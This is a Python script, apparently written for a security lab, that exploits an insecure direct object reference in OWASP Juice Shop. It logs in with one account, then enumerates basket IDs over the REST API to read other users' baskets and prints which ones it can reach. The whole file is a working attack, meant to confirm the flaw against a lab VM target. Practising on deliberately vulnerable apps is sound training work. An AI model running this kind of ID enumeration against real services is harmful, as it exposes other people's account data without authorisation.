import argparse
from typing import Optional
import requests


def login(base_url: str, email: str, password: str) -> str:
    resp = requests.post(
        f"{base_url}/rest/user/login",
        json={"email": email, "password": password},
        timeout=5,
    )
    resp.raise_for_status()
    token = resp.json()["authentication"]["token"]
    return token


def try_basket(base_url: str, token: str, basket_id: int) -> Optional[dict]:
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(f"{base_url}/rest/basket/{basket_id}", headers=headers, timeout=5)
    if resp.status_code == 200:
        return resp.json()
    return None


def main():
    parser = argparse.ArgumentParser(description="IDOR-01 basket enumeration attack")
    parser.add_argument("--target-ip", required=True, help="Ubuntu VM IP running Juice Shop")
    parser.add_argument("--port", default=3000, type=int, help="Juice Shop port (default 3000)")
    parser.add_argument("--email", required=True, help="Login email for the attacker's OWN account")
    parser.add_argument("--password", required=True, help="Login password for that account")
    parser.add_argument("--start-id", default=1, type=int, help="First basket ID to try")
    parser.add_argument("--end-id", default=10, type=int, help="Last basket ID to try")
    args = parser.parse_args()

    base_url = f"http://{args.target_ip}:{args.port}"

    print(f"[*] Logging in as {args.email} ...")
    token = login(base_url, args.email, args.password)
    print(f"[+] Got session token (truncated): {token[:20]}...")

    print(f"[*] Enumerating basket IDs {args.start_id}-{args.end_id} using this ONE token ...\n")

    exposed = []
    for basket_id in range(args.start_id, args.end_id + 1):
        result = try_basket(base_url, token, basket_id)
        if result is not None:
            data = result.get("data", {})
            products = data.get("Products", [])
            names = [p.get("name", "?") for p in products]
            print(f"[!] basket/{basket_id} -> ACCESSIBLE. Contents: {names}")
            exposed.append(basket_id)
        else:
            print(f"[ ] basket/{basket_id} -> blocked / not found")

    print(f"\n[*] Done. {len(exposed)} basket ID(s) were readable with one session: {exposed}")
    print("[*] Any basket ID here that is NOT your own account's basket confirms the IDOR.")


if __name__ == "__main__":
    main()
